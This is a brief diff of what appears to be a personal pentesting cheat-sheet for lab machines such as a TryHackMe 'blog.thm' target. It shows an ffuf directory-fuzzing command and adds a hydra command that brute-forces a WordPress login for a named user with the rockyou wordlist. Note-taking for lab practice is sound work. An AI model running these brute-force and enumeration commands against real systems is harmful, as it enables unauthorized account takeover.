@@ -71,3 +71,7 @@ python3 -m http.server 80080
 
 # fuff coz i hate gobuster 
 ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.142.184/FUZZ -fs 42 -c -v 
+
+# hydra brute force WP
+
+hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.36.107 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
